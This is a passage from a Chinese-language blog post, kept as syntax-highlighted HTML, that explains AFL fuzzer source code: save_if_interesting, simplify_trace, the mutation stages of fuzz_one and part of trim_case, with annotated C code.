class="token function">run_target</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span> exec_tmout<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行测试用例</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>stop_soon<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//如果用户手动中断则返回</span>        syncing_party <span class="token operator">=</span> sd_ent<span class="token operator">-></span>d_name<span class="token punctuation">;</span><span class="token comment">// 设置当前同步的fuzzer的名称</span>        queued_imported <span class="token operator">+=</span> <span class="token function">save_if_interesting</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span> mem<span class="token punctuation">,</span> st<span class="token punctuation">.</span>st_size<span class="token punctuation">,</span> fault<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 如果是 interesting case，保存并增加导入计数</span>        syncing_party <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">munmap</span><span class="token punctuation">(</span>mem<span class="token punctuation">,</span> st<span class="token punctuation">.</span>st_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 解除内存映射</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>stage_cur<span class="token operator">++</span> <span class="token operator">%</span> stats_update_freq<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">show_stats</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//增加 cur 计数器，达到 stats_update_freq  的倍数就刷新 ui 界面</span>      <span class="token punctuation">&#125;</span>      <span class="token function">ck_free</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">ck_write</span><span class="token punctuation">(</span>id_fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>next_min_accept<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>u32<span class="token punctuation">)</span><span class="token punctuation">,</span> qd_synced_path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//向遍历到的其他 fuzz 的文件夹中写入 next_min_accept</span>    <span class="token comment">//关闭文件释放空间</span>    <span class="token function">close</span><span class="token punctuation">(</span>id_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">closedir</span><span class="token punctuation">(</span>qd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ck_free</span><span class="token punctuation">(</span>qd_path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ck_free</span><span class="token punctuation">(</span>qd_synced_path<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token function">closedir</span><span class="token punctuation">(</span>sd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="save-if-interesting"><a href="#save-if-interesting" class="headerlink" title="save_if_interesting"></a>save_if_interesting</h3><ul><li>崩溃模式且崩溃或普通模式且没有崩溃<ul><li>如果 hit count没有变动且没有出现新的边就返回 0，如果是 crash 模式就增加总 crash 数</li><li>设置文件名 out_dir&#x2F;queue&#x2F;id_paths，将测试用例文件保存到队列中</li><li>如果 <a href="##has_new_bits">has_new_bits</a> 发现了新的边则标记为有新覆盖，增加有覆盖的队列数</li><li>计算 trace_bits 哈希值保存到 exec_cksum，调用 <a href="##calibrate_case">calibrate_case</a> 评估测试用例</li><li>如果报错信息是 error 则报错退出，否则根据设置的文件名创建测试用例文件并且将测试用例写入文件，设置 keeping &#x3D; 1</li></ul></li><li>根据报错信息做出不同行为<ul><li>FAULT_TMOUT<ul><li>超时计数器 total_tmouts++</li><li>unique_hangs 的个数超过能保存的最大数量 KEEP_UNIQUE_HANG 返回 keeping 值</li><li>非 dumb 模式调用 <a href="##simplify_trace">simplify_trace</a> 规整 trace_bits，没有发现新的超时路径则返回 keeping</li><li>存在新路径的超时计数器 unique_tmouts++</li><li>执行时间小于 hang_tmout 则重新执行，结果是 crash 跳转到 keep_as_crash，不是超时返回 keeping，中途用户中断则 return</li><li><u>设置文件名为 out_dir&#x2F;hangs&#x2F;id_unique_hangs</u></li><li>存在新路径的挂起计数器unique_hangs++</li><li>设置最后一次挂起时间</li></ul></li><li>FAULT_CRASH &#x2F; keep_as_crash<ul><li>总 crash 数 total_crashes++</li><li>崩溃数量超过最大值则返回 keeping</li><li>非 dumb 模式调用 <a href="##simplify_trace">simplify_trace</a> 规整 trace_bits，没有发现新的超时路径则返回 keeping</li><li>如果是第一次崩溃，生成 README 文件</li><li><u>设置文件名为 out_dir&#x2F;crashes&#x2F;id_unique_crashes_kill_signal</u></li><li>存在新边的 crash 数 unique_crashes++</li><li>获取当前时间作为最后一次 crash 时间，记录最后一次崩溃执行次数</li></ul></li><li>FAULT_ERROR<ul><li>报错退出</li></ul></li><li>default<ul><li>返回 keeping</li></ul></li></ul></li><li>将测试利用写入设置的路径后关闭文件释放内存</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> u8 <span class="token function">save_if_interesting</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> mem<span class="token punctuation">,</span> u32 len<span class="token punctuation">,</span> u8 fault<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u8  <span class="token operator">*</span>fn <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>  u8  hnb<span class="token punctuation">;</span>  s32 fd<span class="token punctuation">;</span>  u8  keeping <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> res<span class="token punctuation">;</span>  <span class="token comment">// 若 fault = crash_mode = 2，则处于 crash exploration 模式且崩溃了</span>  <span class="token comment">// 若 fault = crash_mode = 0，则处于普通模式且没有崩溃或超时</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fault <span class="token operator">==</span> crash_mode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// has_new_bits 返回值：0 表示无成果；1 表示 hit count 变动；2 表示发现了新的边</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>hnb <span class="token operator">=</span> <span class="token function">has_new_bits</span><span class="token punctuation">(</span>virgin_bits<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//hit count没有变动且没有新的边</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>crash_mode<span class="token punctuation">)</span> total_crashes<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//crash 模式，则增加总 crash 数</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//返回 0</span>    <span class="token punctuation">&#125;</span>    <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">SIMPLE_FILES</span></span>    fn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/queue/id:%06u,%s"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">,</span> queued_paths<span class="token punctuation">,</span> <span class="token function">describe_op</span><span class="token punctuation">(</span>hnb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>    fn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/queue/id_%06u"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">,</span> queued_paths<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置文件名 out_dir/queue/id_paths</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* ^!SIMPLE_FILES */</span></span>    <span class="token function">add_to_queue</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将测试用例文件保存到队列中</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hnb <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//发现了新的边</span>      queue_top<span class="token operator">-></span>has_new_cov <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//标记为有新覆盖</span>      queued_with_cov<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//增加有覆盖的队列数</span>    <span class="token punctuation">&#125;</span>    queue_top<span class="token operator">-></span>exec_cksum <span class="token operator">=</span> <span class="token function">hash32</span><span class="token punctuation">(</span>trace_bits<span class="token punctuation">,</span> MAP_SIZE<span class="token punctuation">,</span> HASH_CONST<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 计算 trace_bits 哈希值保存到 exec_cksum</span>    res <span class="token operator">=</span> <span class="token function">calibrate_case</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span> queue_top<span class="token punctuation">,</span> mem<span class="token punctuation">,</span> queue_cycle <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//评估测试用例</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>res <span class="token operator">==</span> FAULT_ERROR<span class="token punctuation">)</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to execute target application"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> O_WRONLY <span class="token operator">|</span> O_CREAT <span class="token operator">|</span> O_EXCL<span class="token punctuation">,</span> <span class="token number">0600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建测试用例文件</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ck_write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> mem<span class="token punctuation">,</span> len<span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将测试用例写入文件</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    keeping <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 标记为保持</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>fault<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> FAULT_TMOUT<span class="token operator">:</span>      total_tmouts<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//超时计数器 +1</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>unique_hangs <span class="token operator">>=</span> KEEP_UNIQUE_HANG<span class="token punctuation">)</span> <span class="token keyword">return</span> keeping<span class="token punctuation">;</span><span class="token comment">//unique_hangs 的个数超过能保存的最大数量 KEEP_UNIQUE_HANG 返回 keeping 值</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dumb_mode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//非简单模式</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__x86_64__</span></span>        <span class="token function">simplify_trace</span><span class="token punctuation">(</span><span class="token punctuation">(</span>u64<span class="token operator">*</span><span class="token punctuation">)</span>trace_bits<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//规整 trace_bits</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>        <span class="token function">simplify_trace</span><span class="token punctuation">(</span><span class="token punctuation">(</span>u32<span class="token operator">*</span><span class="token punctuation">)</span>trace_bits<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* ^__x86_64__ */</span></span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">has_new_bits</span><span class="token punctuation">(</span>virgin_tmout<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> keeping<span class="token punctuation">;</span><span class="token comment">//没有发现新的超时路径则返回 keeping</span>      <span class="token punctuation">&#125;</span>      unique_tmouts<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//存在新路径的超时计数器 +1</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>exec_tmout <span class="token operator">&lt;</span> hang_tmout<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//执行时间小于 hang_tmout 则重新执行，结果是 crash 跳转到 keep_as_crash，不是超时返回 keeping</span>        u8 new_fault<span class="token punctuation">;</span>        <span class="token function">write_to_testcase</span><span class="token punctuation">(</span>mem<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        new_fault <span class="token operator">=</span> <span class="token function">run_target</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span> hang_tmout<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>stop_soon <span class="token operator">&amp;&amp;</span> new_fault <span class="token operator">==</span> FAULT_CRASH<span class="token punctuation">)</span> <span class="token keyword">goto</span> keep_as_crash<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>stop_soon <span class="token operator">||</span> new_fault <span class="token operator">!=</span> FAULT_TMOUT<span class="token punctuation">)</span> <span class="token keyword">return</span> keeping<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">SIMPLE_FILES</span></span>      fn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/hangs/id:%06llu,%s"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">,</span> unique_hangs<span class="token punctuation">,</span> <span class="token function">describe_op</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>      fn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/hangs/id_%06llu"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">,</span> unique_hangs<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置文件名为 out_dir/hangs/id_unique_hangs</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* ^!SIMPLE_FILES */</span></span>      unique_hangs<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//增加 unique_hangs</span>      last_hang_time <span class="token operator">=</span> <span class="token function">get_cur_time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取最后一次挂起时间</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> FAULT_CRASH<span class="token operator">:</span>keep_as_crash<span class="token operator">:</span>      total_crashes<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//增加总 crash 数</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>unique_crashes <span class="token operator">>=</span> KEEP_UNIQUE_CRASH<span class="token punctuation">)</span> <span class="token keyword">return</span> keeping<span class="token punctuation">;</span><span class="token comment">//崩溃数量超过最大值</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dumb_mode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//同上</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__x86_64__</span></span>        <span class="token function">simplify_trace</span><span class="token punctuation">(</span><span class="token punctuation">(</span>u64<span class="token operator">*</span><span class="token punctuation">)</span>trace_bits<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>        <span class="token function">simplify_trace</span><span class="token punctuation">(</span><span class="token punctuation">(</span>u32<span class="token operator">*</span><span class="token punctuation">)</span>trace_bits<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* ^__x86_64__ */</span></span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">has_new_bits</span><span class="token punctuation">(</span>virgin_crash<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> keeping<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>unique_crashes<span class="token punctuation">)</span> <span class="token function">write_crash_readme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 如果是第一次崩溃，生成 README 文件</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">SIMPLE_FILES</span></span>      fn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/crashes/id:%06llu,sig:%02u,%s"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">,</span> unique_crashes<span class="token punctuation">,</span> kill_signal<span class="token punctuation">,</span> <span class="token function">describe_op</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>      fn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/crashes/id_%06llu_%02u"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">,</span> unique_crashes<span class="token punctuation">,</span> kill_signal<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置文件名为 out_dir/crashes/id_unique_crashes_kill_signal</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* ^!SIMPLE_FILES */</span></span>      unique_crashes<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//存在新边的 crash 数 +1</span>      last_crash_time <span class="token operator">=</span> <span class="token function">get_cur_time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取当前时间作为最后一次 crash 时间</span>      last_crash_execs <span class="token operator">=</span> total_execs<span class="token punctuation">;</span><span class="token comment">// 记录最后一次崩溃执行次数</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> FAULT_ERROR<span class="token operator">:</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to execute target application"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//error 错误则报错退出</span>    <span class="token keyword">default</span><span class="token operator">:</span> <span class="token keyword">return</span> keeping<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> O_WRONLY <span class="token operator">|</span> O_CREAT <span class="token operator">|</span> O_EXCL<span class="token punctuation">,</span> <span class="token number">0600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ck_write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> mem<span class="token punctuation">,</span> len<span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将测试利用写入设置的路径</span>  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ck_free</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> keeping<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="simplify-trace"><a href="#simplify-trace" class="headerlink" title="simplify_trace"></a>simplify_trace</h3><p>简化跟踪位，保留「是否命中」而不保留 count</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">const</span> u8 simplify_lookup<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>   <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>         <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token number">255</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>循环 8 字节读 mem</li><li>mem 不为空则将其每一位规整到 1（未命中） &#x2F; 128（命中）</li><li>mem 为空则设置 mem &#x3D; 0x0101010101010101</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">simplify_trace</span><span class="token punctuation">(</span>u64<span class="token operator">*</span> mem<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u32 i <span class="token operator">=</span> MAP_SIZE <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">*</span>mem<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      u8<span class="token operator">*</span> mem8 <span class="token operator">=</span> <span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">;</span>      mem8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> simplify_lookup<span class="token punctuation">[</span>mem8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      mem8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> simplify_lookup<span class="token punctuation">[</span>mem8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      mem8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> simplify_lookup<span class="token punctuation">[</span>mem8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      mem8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> simplify_lookup<span class="token punctuation">[</span>mem8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      mem8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> simplify_lookup<span class="token punctuation">[</span>mem8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      mem8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> simplify_lookup<span class="token punctuation">[</span>mem8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      mem8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> simplify_lookup<span class="token punctuation">[</span>mem8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      mem8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> simplify_lookup<span class="token punctuation">[</span>mem8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token operator">*</span>mem <span class="token operator">=</span> <span class="token number">0x0101010101010101ULL</span><span class="token punctuation">;</span>    mem<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one"></a>fuzz_one</h3><p>三种变异方式： 确定性变异 deterministic、随机变异 havoc、拼接变异 splicing，源码太长，就不放了（</p><ul><li>从 queue 取出一个测试用例<ul><li>pending_favored !&#x3D; 0 &amp; 测试用例已经完成 fuzz &#x2F; 非favored ：99% 概率跳过</li><li>pending_favored &#x3D;&#x3D; 0 &amp; ！dumb_mode &amp; 非 favored &amp; 测试用例数量大于 10<ul><li>queue_cycle &gt; 1 &amp; 测试用例未被 fuzz ：75% 概率跳过</li><li>测试用例已经完成 fuzz ：95% 概率跳过</li></ul></li></ul></li><li>测试用例有校准错误且小于三次，调用 <a href="##calibrate_case">calibrate_case</a> 再次校准</li><li>调用 <a href="##trim_case">trim_case</a> 对测试用例进行修剪</li><li>已经经历过确定性变异则直接跳转至 havoc 阶段，否则调用 <a href="##calculate_score">calculate_score</a> 函数计算当前 case 的可取性得分后进行确定性变异</li><li>确定性变异 deterministic：<ul><li>字节翻转：bitflip a&#x2F;b：每次翻转 a 位，按 b 位步长从头开始，例如 bitflip 1&#x2F;1 就是将每一位都翻转，在 bitflip8&#x2F;8 之后会自动检测 token，获取翻转后对路径有影响的值</li><li>算数变异：arithmetic a&#x2F;b：每次 a bit 进行加减运算，b bit步长从头开始，存在大端序和小端序两种形式对模板整数 +1 … +35 … -1 … -35</li><li>INTERESTING VALUES：interest a&#x2F;b，每次 a bit 进行加减运算，b bit 步长从头开始，替换为预设的 interesting 值</li><li>DICTIONARY STUFF：替换成用户 -x 指定的字典中的 token，存在 user extras(over) 替换、user extras(insert) 插入、auto extras(over) 自动检测替换 三种模式</li></ul></li><li>随机变异 havoc：随机加减替换插入已知 token 或随即值</li><li>拼接 splicing：havoc 没什么效果就会进入 splicing，拼接两个测试用例再重复上述变异</li></ul><h3 id="trim-case"><a href="#trim-case" class="headerlink" title="trim_case"></a>trim_case</h3><p>裁剪测试用例，节约在进行确定性检查时的循环次数</p><ul><li>测试用例长度小于 5 直接返回，更新 stage_name 和 累计裁剪输入的字节数 bytes_trim_in，选择初始块长度 len_p2（第一个大于等于 q-&gt;len 的 2 的次幂），计算前进步长</li><li>循环直至剩余大小小于 max{len_p2 &#x2F; 1024, 